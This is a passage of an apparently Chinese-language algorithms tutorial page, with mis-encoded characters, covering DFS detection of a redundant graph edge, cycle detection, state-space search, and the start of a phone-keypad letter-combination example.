class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">findRedundantConnection</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; edges)</span> </span>&#123;<br>        n = <span class="hljs-number">0</span>;  <span class="hljs-comment">// åˆå§‹åŒ–èŠ‚ç‚¹æ•°</span><br>        <span class="hljs-comment">// è®¡ç®—å®é™…çš„æœ€å¤§èŠ‚ç‚¹ç¼–å·ï¼ˆnï¼‰</span><br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123;<br>            <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>], y = edge[<span class="hljs-number">1</span>];  <span class="hljs-comment">// è·å–å½“å‰è¾¹çš„ä¸¤ä¸ªèŠ‚ç‚¹</span><br>            n = <span class="hljs-built_in">max</span>(n, <span class="hljs-built_in">max</span>(x, y));  <span class="hljs-comment">// æ›´æ–°æœ€å¤§èŠ‚ç‚¹ç¼–å·</span><br>        &#125;<br><br>        <span class="hljs-comment">// åˆå§‹åŒ–é‚»æ¥è¡¨å’Œè®¿é—®æ ‡è®°æ•°ç»„</span><br>        to = vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;(n + <span class="hljs-number">1</span>, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;());<br>        visited = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">bool</span>&gt;(n + <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<br><br>        <span class="hljs-comment">// éå†æ‰€æœ‰è¾¹ï¼Œæ„å»ºå›¾å¹¶æ£€æŸ¥ç¯</span><br>        <span class="hljs-keyword">for</span> (vector&lt;<span class="hljs-type">int</span>&gt;&amp; edge : edges) &#123;<br>            <span class="hljs-type">int</span> x = edge[<span class="hljs-number">0</span>], y = edge[<span class="hljs-number">1</span>];  <span class="hljs-comment">// è·å–å½“å‰è¾¹çš„ä¸¤ä¸ªèŠ‚ç‚¹</span><br>            <br>            <span class="hljs-comment">// æ·»åŠ è¾¹åˆ°é‚»æ¥è¡¨ä¸­ï¼Œæ„å»ºæ— å‘å›¾ï¼Œé‚»æ¥è¡¨çš„æ„å»º</span><br>            to[x].<span class="hljs-built_in">push_back</span>(y);<br>            to[y].<span class="hljs-built_in">push_back</span>(x);<br>            hasCycle = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// é‡ç½®ç¯æ ‡è®°</span><br>            <span class="hljs-built_in">dfs</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);  <span class="hljs-comment">// ä»èŠ‚ç‚¹1å¼€å§‹DFSï¼Œçˆ¶èŠ‚ç‚¹è®¾ä¸º0ï¼ˆä¸å­˜åœ¨ï¼‰</span><br><br>            <span class="hljs-comment">// å¦‚æœæ£€æµ‹åˆ°ç¯ï¼Œè¿”å›å½“å‰è¾¹</span><br>            <span class="hljs-keyword">if</span> (hasCycle) <span class="hljs-keyword">return</span> edge;<br>        &#125;<br>        <span class="hljs-keyword">return</span> &#123;&#125;;  <span class="hljs-comment">// å¦‚æœæ²¡æœ‰å‘ç°å†—ä½™è¾¹ï¼Œè¿”å›ç©ºæ•°ç»„</span><br>    &#125;<br><br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-comment">// æ·±åº¦ä¼˜å…ˆæœç´¢ (DFS) ç”¨äºæ£€æµ‹æ˜¯å¦å½¢æˆç¯,dfsæ¨¡ç‰ˆ</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> fa)</span> </span>&#123;<br>        visited[x] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// æ ‡è®°å½“å‰èŠ‚ç‚¹å·²è®¿é—®</span><br>        <span class="hljs-comment">// éå†å½“å‰èŠ‚ç‚¹ x çš„æ‰€æœ‰é‚»å±…èŠ‚ç‚¹</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> y : to[x]) &#123;<br>            <span class="hljs-keyword">if</span> (y == fa) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// å¦‚æœæ˜¯çˆ¶èŠ‚ç‚¹ï¼Œåˆ™è·³è¿‡</span><br>            <span class="hljs-keyword">if</span> (!visited[y]) &#123;<br>                <span class="hljs-comment">// å¦‚æœæœªè®¿é—®ï¼Œç»§ç»­é€’å½’DFS</span><br>                <span class="hljs-built_in">dfs</span>(y, x);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// å¦‚æœå·²ç»è®¿é—®è¿‡ï¼Œè¯´æ˜å­˜åœ¨ç¯</span><br>                hasCycle = <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">int</span> n;  <span class="hljs-comment">// èŠ‚ç‚¹æ€»æ•°</span><br>    vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; to;  <span class="hljs-comment">// é‚»æ¥è¡¨ï¼Œå­˜å‚¨æ¯ä¸ªèŠ‚ç‚¹çš„é‚»å±…</span><br>    vector&lt;<span class="hljs-type">bool</span>&gt; visited;  <span class="hljs-comment">// æ ‡è®°èŠ‚ç‚¹æ˜¯å¦è®¿é—®è¿‡</span><br>    <span class="hljs-type">bool</span> hasCycle;  <span class="hljs-comment">// æ˜¯å¦å­˜åœ¨ç¯çš„æ ‡è®°</span><br>&#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">éå†è¾¹ &#123;1, 2&#125;ï¼Œå›¾ä¸­æ²¡æœ‰ç¯ï¼Œç»§ç»­ã€‚</span><br><span class="hljs-comment">éå†è¾¹ &#123;1, 3&#125;ï¼Œå›¾ä¸­æ²¡æœ‰ç¯ï¼Œç»§ç»­ã€‚</span><br><span class="hljs-comment">éå†è¾¹ &#123;2, 3&#125;ï¼Œæ­¤æ—¶æ£€æµ‹åˆ°ç¯ï¼Œè¿”å› &#123;2, 3&#125;ã€‚</span><br><span class="hljs-comment">å‡è®¾è¾“å…¥ï¼š</span><br><span class="hljs-comment">edges = &#123;&#123;1, 2&#125;, &#123;1, 3&#125;, &#123;2, 3&#125;&#125;</span><br><span class="hljs-comment">è¿™è¡¨ç¤ºæœ‰ 3 æ¡è¾¹å’Œ 3 ä¸ªèŠ‚ç‚¹ï¼Œå›¾çš„ç»“æ„å¦‚ä¸‹ï¼š</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">å¤åˆ¶ä»£ç </span><br><span class="hljs-comment">1 - 2</span><br><span class="hljs-comment">|   |</span><br><span class="hljs-comment">3 - -</span><br><span class="hljs-comment">æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€æ¡å†—ä½™çš„è¾¹ï¼Œè¿™æ¡è¾¹çš„åŠ å…¥ä¼šå¯¼è‡´å½¢æˆç¯ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">æ¨¡æ‹Ÿæ‰§è¡Œè¿‡ç¨‹ï¼š</span><br><span class="hljs-comment">ç¬¬ä¸€æ­¥ï¼šåˆå§‹åŒ–</span><br><span class="hljs-comment">åˆå§‹åŒ– n = 0ï¼Œç”¨äºå­˜å‚¨èŠ‚ç‚¹çš„æœ€å¤§ç¼–å·ã€‚</span><br><span class="hljs-comment">éå† edgesï¼Œæ›´æ–° n ä¸ºæœ€å¤§èŠ‚ç‚¹ç¼–å·ï¼Œæœ€ç»ˆå¾—åˆ° n = 3ã€‚</span><br><span class="hljs-comment">åˆå§‹åŒ–é‚»æ¥è¡¨ to å’Œè®¿é—®æ ‡è®°æ•°ç»„ visitedï¼š</span><br><span class="hljs-comment">to = [[], [], [], []]  // é‚»æ¥è¡¨åˆå§‹åŒ–ï¼Œ4 ä¸ªç©ºåˆ—è¡¨ï¼ˆå› ä¸ºèŠ‚ç‚¹ç¼–å·ä» 1 å¼€å§‹ï¼‰</span><br><span class="hljs-comment">visited = [false, false, false, false]  // èŠ‚ç‚¹è®¿é—®æ ‡è®°ï¼Œå…¨éƒ¨ä¸º false</span><br><span class="hljs-comment">ç¬¬äºŒæ­¥ï¼šå¼€å§‹éå†æ¯ä¸€æ¡è¾¹</span><br><span class="hljs-comment">æˆ‘ä»¬ä¾æ¬¡å¤„ç†æ¯ä¸€æ¡è¾¹ï¼Œå°†å…¶åŠ å…¥é‚»æ¥è¡¨ï¼Œå¹¶è¿›è¡Œ DFS æ£€æµ‹æ˜¯å¦æœ‰ç¯ã€‚</span><br><span class="hljs-comment">å¤„ç†è¾¹ &#123;1, 2&#125;ï¼š</span><br><span class="hljs-comment">å°†è¾¹ &#123;1, 2&#125; åŠ å…¥é‚»æ¥è¡¨ï¼š</span><br><span class="hljs-comment">to = [[], [2], [1], []]  // èŠ‚ç‚¹ 1 å’Œ 2 äº’ä¸ºé‚»å±…</span><br><span class="hljs-comment">é‡ç½® hasCycle = falseï¼Œå¼€å§‹ DFSã€‚</span><br><span class="hljs-comment">ä»èŠ‚ç‚¹ 1 å¼€å§‹è¿›è¡Œ DFSï¼Œçˆ¶èŠ‚ç‚¹è®¾ä¸º 0ï¼ˆä¸å­˜åœ¨ï¼‰ã€‚</span><br><span class="hljs-comment">DFS è¿‡ç¨‹ï¼š</span><br><span class="hljs-comment">è®¿é—®èŠ‚ç‚¹ 1ï¼Œæ ‡è®°ä¸ºå·²è®¿é—®ï¼š</span><br><span class="hljs-comment">visited = [false, true, false, false]</span><br><span class="hljs-comment">éå†èŠ‚ç‚¹ 1 çš„é‚»å±…èŠ‚ç‚¹ï¼Œå‘ç°èŠ‚ç‚¹ 2 å°šæœªè®¿é—®ï¼Œå› æ­¤è¿›å…¥èŠ‚ç‚¹ 2 çš„ DFSã€‚</span><br><span class="hljs-comment">è®¿é—®èŠ‚ç‚¹ 2ï¼Œæ ‡è®°ä¸ºå·²è®¿é—®ï¼š</span><br><span class="hljs-comment">visited = [false, true, true, false]</span><br><span class="hljs-comment">èŠ‚ç‚¹ 2 çš„é‚»å±…æ˜¯èŠ‚ç‚¹ 1ï¼ˆçˆ¶èŠ‚ç‚¹ï¼‰ï¼Œè·³è¿‡ã€‚</span><br><span class="hljs-comment">ç»“æŸ DFSï¼Œæ²¡æœ‰å‘ç°ç¯ã€‚</span><br><span class="hljs-comment">å¤„ç†è¾¹ &#123;1, 3&#125;ï¼š</span><br><span class="hljs-comment">å°†è¾¹ &#123;1, 3&#125; åŠ å…¥é‚»æ¥è¡¨ï¼š</span><br><span class="hljs-comment">to = [[], [2, 3], [1], [1]]  // èŠ‚ç‚¹ 1 å’Œ 3 äº’ä¸ºé‚»å±…</span><br><span class="hljs-comment">é‡ç½® hasCycle = falseï¼Œå¼€å§‹ DFSã€‚</span><br><span class="hljs-comment">ä»èŠ‚ç‚¹ 1 å¼€å§‹è¿›è¡Œ DFSï¼Œçˆ¶èŠ‚ç‚¹è®¾ä¸º 0ï¼ˆä¸å­˜åœ¨ï¼‰ã€‚</span><br><span class="hljs-comment">DFS è¿‡ç¨‹ï¼š</span><br><span class="hljs-comment">è®¿é—®èŠ‚ç‚¹ 1ï¼Œæ ‡è®°ä¸ºå·²è®¿é—®ï¼š</span><br><span class="hljs-comment">visited = [false, true, true, false]</span><br><span class="hljs-comment">éå†èŠ‚ç‚¹ 1 çš„é‚»å±…ï¼Œå‘ç°èŠ‚ç‚¹ 2 å·²è®¿é—®è¿‡ï¼Œè·³è¿‡ã€‚</span><br><span class="hljs-comment">å‘ç°èŠ‚ç‚¹ 3 å°šæœªè®¿é—®ï¼Œè¿›å…¥èŠ‚ç‚¹ 3 çš„ DFSã€‚</span><br><span class="hljs-comment">è®¿é—®èŠ‚ç‚¹ 3ï¼Œæ ‡è®°ä¸ºå·²è®¿é—®ï¼š</span><br><span class="hljs-comment">visited = [false, true, true, true]</span><br><span class="hljs-comment">èŠ‚ç‚¹ 3 çš„é‚»å±…æ˜¯èŠ‚ç‚¹ 1ï¼ˆçˆ¶èŠ‚ç‚¹ï¼‰ï¼Œè·³è¿‡ã€‚</span><br><span class="hljs-comment">ç»“æŸ DFSï¼Œæ²¡æœ‰å‘ç°ç¯ã€‚</span><br><span class="hljs-comment">å¤„ç†è¾¹ &#123;2, 3&#125;ï¼š</span><br><span class="hljs-comment">å°†è¾¹ &#123;2, 3&#125; åŠ å…¥é‚»æ¥è¡¨ï¼š</span><br><span class="hljs-comment">to = [[], [2, 3], [1, 3], [1, 2]]  // èŠ‚ç‚¹ 2 å’Œ 3 äº’ä¸ºé‚»å±…</span><br><span class="hljs-comment">é‡ç½® hasCycle = falseï¼Œå¼€å§‹ DFSã€‚</span><br><span class="hljs-comment">ä»èŠ‚ç‚¹ 1 å¼€å§‹è¿›è¡Œ DFSï¼Œçˆ¶èŠ‚ç‚¹è®¾ä¸º 0ï¼ˆä¸å­˜åœ¨ï¼‰ã€‚</span><br><span class="hljs-comment">DFS è¿‡ç¨‹ï¼š</span><br><span class="hljs-comment">è®¿é—®èŠ‚ç‚¹ 1ï¼Œæ ‡è®°ä¸ºå·²è®¿é—®ï¼š</span><br><span class="hljs-comment">visited = [false, true, true, true]</span><br><span class="hljs-comment">éå†èŠ‚ç‚¹ 1 çš„é‚»å±…ï¼Œå‘ç°èŠ‚ç‚¹ 2 å·²è®¿é—®è¿‡ï¼Œè·³è¿‡ã€‚</span><br><span class="hljs-comment">å‘ç°èŠ‚ç‚¹ 3 å·²è®¿é—®è¿‡ï¼Œè·³è¿‡ã€‚</span><br><span class="hljs-comment">ç„¶åï¼ŒèŠ‚ç‚¹ 2 ç»§ç»­è¿›è¡Œ DFSï¼Œå‘ç°èŠ‚ç‚¹ 3 å·²è®¿é—®è¿‡ï¼Œä½†èŠ‚ç‚¹ 3 ä¸æ˜¯çˆ¶èŠ‚ç‚¹ï¼Œè¯´æ˜å½¢æˆç¯ã€‚</span><br><span class="hljs-comment">æ ‡è®° hasCycle = trueã€‚</span><br><span class="hljs-comment">ç»“æŸ DFSï¼Œå‘ç°ç¯ï¼Œå†—ä½™è¾¹æ˜¯ &#123;2, 3&#125;ã€‚</span><br><span class="hljs-comment">ç¬¬ä¸‰æ­¥ï¼šè¿”å›ç»“æœ</span><br><span class="hljs-comment">å› ä¸ºåœ¨å¤„ç†è¾¹ &#123;2, 3&#125; æ—¶å‘ç°äº†ç¯ï¼Œå› æ­¤è¯¥è¾¹å°±æ˜¯å†—ä½™è¾¹ï¼Œè¿”å›ï¼š</span><br><span class="hljs-comment">&#123;2, 3&#125;</span><br><span class="hljs-comment">ç»“æœï¼š</span><br><span class="hljs-comment">å†—ä½™è¾¹æ˜¯ &#123;2, 3&#125;ï¼Œè¿™æ¡è¾¹å¯¼è‡´äº†ç¯çš„å‡ºç°ã€‚</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">è§£é‡Šï¼š</span><br><span class="hljs-comment">è¾¹ &#123;1, 2&#125; å’Œ &#123;1, 3&#125; æ„å»ºäº†å›¾çš„ä¸»ä½“ç»“æ„ï¼Œä½†åœ¨åŠ å…¥ &#123;2, 3&#125; åï¼Œå½¢æˆäº†ä¸€ä¸ªç¯ 1 â†’ 2 â†’ 3 â†’ 1ï¼Œå› æ­¤ &#123;2, 3&#125; æ˜¯å†—ä½™è¾¹ã€‚</span><br><span class="hljs-comment">ä»£ç é€šè¿‡ DFS é€’å½’æ£€æµ‹é‚»å±…èŠ‚ç‚¹ï¼Œå¦‚æœå‘ç°æŸä¸ªå·²è®¿é—®çš„èŠ‚ç‚¹ä¸æ˜¯å½“å‰èŠ‚ç‚¹çš„çˆ¶èŠ‚ç‚¹ï¼Œåˆ™è¯´æ˜æœ‰ç¯å‡ºç°ã€‚    </span><br><span class="hljs-comment">*/</span><br>    <br></code></pre></td></tr></table></figure><h4 id="ç¯æ£€æµ‹"><a href="#ç¯æ£€æµ‹" class="headerlink" title="ç¯æ£€æµ‹"></a><strong>ç¯æ£€æµ‹</strong></h4><p><strong>ä»£ç å®ç°</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">bool</span> hasCycle = <span class="hljs-literal">false</span>;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> u, vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; to, vector&lt;<span class="hljs-type">bool</span>&gt;&amp; visited, vector&lt;<span class="hljs-type">bool</span>&gt;&amp; onPath)</span> </span>&#123;<br>    visited[u] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// æ ‡è®°å½“å‰èŠ‚ç‚¹ä¸ºå·²è®¿é—®</span><br>    onPath[u] = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å½“å‰èŠ‚ç‚¹ä½äºé€’å½’è·¯å¾„ä¸Š</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : to[u]) &#123;<br>        <span class="hljs-keyword">if</span> (!visited[v]) &#123;<br>            <span class="hljs-built_in">dfs</span>(v, to, visited, onPath);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (onPath[v]) &#123;<br>            hasCycle = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// æ£€æµ‹åˆ°ç¯</span><br>        &#125;<br>    &#125;<br>    onPath[u] = <span class="hljs-literal">false</span>;  <span class="hljs-comment">// é€’å½’ç»“æŸåï¼Œç§»é™¤è·¯å¾„ä¸Šçš„èŠ‚ç‚¹</span><br>&#125;<br></code></pre></td></tr></table></figure><hr><h2 id="åä¸ƒ-æœç´¢"><a href="#åä¸ƒ-æœç´¢" class="headerlink" title="åä¸ƒ.æœç´¢"></a>åä¸ƒ.æœç´¢</h2><h3 id="çŠ¶æ€ä¸çŠ¶æ€ç©ºé—´æœç´¢"><a href="#çŠ¶æ€ä¸çŠ¶æ€ç©ºé—´æœç´¢" class="headerlink" title="çŠ¶æ€ä¸çŠ¶æ€ç©ºé—´æœç´¢"></a><strong>çŠ¶æ€ä¸çŠ¶æ€ç©ºé—´æœç´¢</strong></h3><ul><li><p><strong>çŠ¶æ€</strong>ï¼š</p><p>ä»€ä¹ˆæ˜¯çŠ¶æ€?é¢˜é¢ä¸­æ¶‰åŠçš„æ‰€æœ‰æ•°å­¦ä¿¡æ¯ï¼Œä½ åœ¨çº¸ä¸ŠäººåŠ›è®¡ç®—æ—¶ï¼Œå…³æ³¨çš„æ‰€æœ‰æ•°æ®ï¼Œä¸€ä¸ªå‡½æ•°è®¿é—®çš„æ‰€æœ‰å˜é‡ï¼Œä¾‹å¦‚æœ€ç®€å•çš„è®¡ç¥¨é—®é¢˜ï¼Œç»™nä¸ªåå­—ï¼Œç»Ÿè®¡æ¯ä¸ªåå­—å‡ºç°äº†å¤šå°‘æ¬¡ï¼Œä½ åœ¨çº¸ä¸Šç”»â€œæ­£â€å­—ç»Ÿè®¡çš„æ—¶å€™ï¼Œå…³æ³¨äº†å“ªäº›æ•°æ®?åå­—(nä¸ªå­—ç¬¦ä¸²)ï¼Œç»Ÿè®¡åˆ°å“ªä¸ªåå­—äº†(ç¬¬1â‰¤iâ‰¤nä¸ªåå­—)ï¼Œç”»çš„â€œæ­£â€å­—(ä¸€ä¸ªç”¨äºè®¡æ•°çš„æ•°æ®ç»“æ„ï¼Œä¾‹å¦‚ Hash Mapï¼Œå°±æ˜¯ç¨‹åºç»´æŠ¤çš„æ‰€æœ‰åŠ¨æ€æ•°æ®æ„æˆçš„é›†åˆï¼Œæˆ‘ä»¬å…³æ³¨åŠ¨æ€å˜åŒ–çš„å˜é‡</p></li><li><p><strong>çŠ¶æ€ç©ºé—´</strong></p><p>æ‰€æœ‰å¯èƒ½çŠ¶æ€æ„æˆçš„é›†åˆå°±æ˜¯ä¸€ä¸ªé—®é¢˜çš„çŠ¶æ€ç©ºé—´ï¼ŒæŠŠçŠ¶æ€ä½œä¸ºç‚¹ï¼Œå¦‚æœä»ä¸€ä¸ªçŠ¶æ€å¯ä»¥åˆ°è¾¾å¦ä¸€ä¸ªçŠ¶æ€ï¼Œå°±è¿ä¸€æ¡è¾¹è¿™æ ·å°±æŠŠæ•´ï¼ŒçŠ¶æ€ç©ºé—´æŠ½è±¡ä¸ºäº†ä¸€å¼ æœ‰å‘å›¾ï¼Œå¯¹é—®é¢˜çš„æ±‚è§£ï¼Œå°±æ˜¯å¯¹è¿™å¼ å›¾çš„éå†ï¼Œè®¡ç¥¨é—®é¢˜çš„çŠ¶æ€ç©ºé—´ç”±nä¸ªçŠ¶æ€ç»„æˆï¼Œå¯ä»¥çœ‹ä½œä¸€å¼ nä¸ªç‚¹ï¼Œn-1æ¡è¾¹çš„æœ‰å‘å›¾ï¼Œæ•´å¼ å›¾æ˜¯ä¸€æ¡é“¾ï¼Œè‡ªç„¶å°±å¯ä»¥ç”¨ä¸€ç»´å¾ªç¯è§£å†³äº†</p></li><li><p><strong>æœç´¢ç®—æ³•</strong>ï¼š</p><ul><li><strong>æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</strong>ï¼šä¼˜å…ˆæ¢ç´¢å½“å‰è·¯å¾„ï¼Œæ·±å…¥åˆ°ä¸èƒ½ç»§ç»­ä¸ºæ­¢ï¼Œå†è¿›è¡Œå›æº¯ã€‚é€‚ç”¨äºéœ€è¦éå†æ•´æ£µæœç´¢æ ‘æˆ–å›¾çš„åœºæ™¯ã€‚</li><li><strong>å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰</strong>ï¼šæŒ‰ç…§å±‚æ¬¡é€æ­¥æ‰©å±•æ‰€æœ‰çŠ¶æ€ï¼Œé€‚ç”¨äºæœ€çŸ­è·¯å¾„ç­‰éœ€è¦æ‰¾åˆ°æœ€æ—©è§£çš„åœºæ™¯ã€‚</li><li>ä¸€èˆ¬æ¥è¯´ï¼Œæ¯ä¸ªçŠ¶æ€åªéå†ä¸€æ¬¡æ‰€ä»¥å½“çŠ¶æ€ç©ºé—´æ˜¯â€œå›¾â€è€Œä¸æ˜¯â€œæ ‘â€æ—¶ï¼Œè¦åˆ¤é‡(è®°å¿†åŒ–)</li></ul></li></ul><h3 id="çŠ¶æ€æœç´¢çš„æ­¥éª¤"><a href="#çŠ¶æ€æœç´¢çš„æ­¥éª¤" class="headerlink" title="çŠ¶æ€æœç´¢çš„æ­¥éª¤"></a><strong>çŠ¶æ€æœç´¢çš„æ­¥éª¤</strong></h3><p>æœç´¢é¢˜çš„è§£é¢˜æ­¥éª¤<br>1.çº¸ä¸Šæ¨¡æ‹Ÿï¼Œæå–ä¿¡æ¯<br>2.å®šä¹‰çŠ¶æ€<br>3.ç¡®å®šéå†é¡ºåº(DFSã€BFS)<br>4.å®šä¹‰æœç´¢æ¡†æ¶<br>    å¦‚æœæ˜¯DFSï¼ŒçŠ¶æ€ä½œä¸ºå‚æ•°ï¼Œç¡®å®šé€’å½’è¾¹ç•Œï¼Œæ³¨æ„è¿˜åŸç°åœº<br>    å¦‚æœæ˜¯BFSï¼ŒçŠ¶æ€ç”¨é˜Ÿåˆ—ä¿å­˜<br>    è€ƒè™‘æ˜¯å¦éœ€è¦åˆ¤é‡<br>5.ç¨‹åºå®ç°</p><p><strong>DFS å’Œ BFS çš„æ¯”è¾ƒ</strong>ï¼š</p><ul><li><strong>æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</strong>ï¼šä¼˜å…ˆæ¢ç´¢å½“å‰è·¯å¾„ï¼Œæ·±å…¥åˆ°ä¸èƒ½ç»§ç»­ä¸ºæ­¢ï¼Œå†è¿›è¡Œå›æº¯ã€‚é€‚ç”¨äºéœ€è¦éå†æ•´æ£µæœç´¢æ ‘æˆ–å›¾çš„åœºæ™¯ã€‚</li><li><strong>å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰</strong>ï¼šæŒ‰ç…§å±‚æ¬¡é€æ­¥æ‰©å±•æ‰€æœ‰çŠ¶æ€ï¼Œé€‚ç”¨äº<code>æœ€çŸ­</code>è·¯å¾„ç­‰éœ€è¦æ‰¾åˆ°<code>æœ€æ—©</code>è§£çš„åœºæ™¯ã€‚</li><li>çŠ¶æ€ç©ºé—´ä¸ºæœ‰å‘æ— ç¯å›¾æˆ–æ˜¯æ±‚æœ€å¤§ï¼Œæœ€é•¿<br>BFSæ‹“æ‰‘æ’åº&#x2F;DFSè®°å¿†åŒ–æœç´¢å‡å¯,è¦å»è®°ä¸€ä¸ªdistè·¯å¾„</li></ul><hr><h3 id="ä¾‹é¢˜-8"><a href="#ä¾‹é¢˜-8" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="ç”µè¯å·ç çš„å­—æ¯ç»„åˆé—®é¢˜ï¼š"><a href="#ç”µè¯å·ç çš„å­—æ¯ç»„åˆé—®é¢˜ï¼š" class="headerlink" title="ç”µè¯å·ç çš„å­—æ¯ç»„åˆé—®é¢˜ï¼š"></a>ç”µè¯å·ç çš„å­—æ¯ç»„åˆé—®é¢˜ï¼š</h4><p>ç»™å®šä¸€ä¸ªä»…åŒ…å«æ•°å­— <code>2-9</code> çš„å­—ç¬¦ä¸²ï¼Œè¿”å›æ‰€æœ‰å®ƒèƒ½è¡¨ç¤ºçš„å­—æ¯ç»„åˆã€‚æ•°å­—åˆ°å­—æ¯çš„æ˜ å°„ä¸ç”µè¯æŒ‰é”®ä¸€è‡´ã€‚</p><p>ä¾‹å¦‚ï¼š</p><ul><li>è¾“å…¥ï¼šâ€23â€</li><li>è¾“å‡ºï¼š[â€œadâ€, â€œaeâ€, â€œafâ€, â€œbdâ€, â€œbeâ€, â€œbfâ€, â€œcdâ€, â€œceâ€, â€œcfâ€]</li></ul><p><strong>æ€è·¯</strong>ï¼š</p><ul><li><strong>é€’å½’ï¼ˆDFSï¼‰å®ç°</strong>ï¼šè¯¥é—®é¢˜å¯ä»¥è¢«çœ‹ä½œæ˜¯ä¸€ä¸ªé€’å½’é—®é¢˜ï¼Œæ¯ä¸ªæ•°å­—å¯¹åº”å¤šä¸ªå­—æ¯ï¼Œæ¯ä¸ªæ•°å­—çš„å­—æ¯ç»„åˆéƒ½ä¸å‰ä¸€ä¸ªæ•°å­—çš„å­—æ¯ç»„åˆè¿›è¡Œå…¨æ’åˆ—ã€‚</li><li><strong>çŠ¶æ€è½¬ç§»</strong>ï¼šæ¯ä¸ªçŠ¶æ€è¡¨ç¤ºå½“å‰é€’å½’åˆ°ç¬¬å‡ ä¸ªæ•°å­—ï¼Œæ¯æ¬¡é€’å½’æ—¶é€‰æ‹©å¯¹åº”æ•°å­—æ‰€æ˜ å°„çš„å­—æ¯ï¼Œç”Ÿæˆæ‰€æœ‰å¯èƒ½çš„å­—æ¯ç»„åˆã€‚</li></ul><p><strong>ä»£ç å®ç°</strong>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_LEN = <span class="hljs-number">10</span>;  <span class="hljs-comment">// å‡è®¾æœ€å¤š10ä¸ªæ•°å­—</span><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAX_RES = <span class="hljs-number">1000</span>;  <span class="hljs-comment">// å‡è®¾æœ€å¤šç”Ÿæˆ1000ä¸ªç»“æœ</span><br><br>unordered_map&lt;<span class="hljs-type">char</span>, string&gt; alphabet;<br>string digits;<br>string ans[MAX_RES];  <span class="hljs-comment">// ç”¨é™æ€æ•°ç»„ä¿å­˜ç»“æœ</span><br><span class="hljs-type">int</span> ans_size = <span class="hljs-number">0</span>;  <span class="hljs-comment">// ç»“æœçš„ä¸ªæ•°</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span 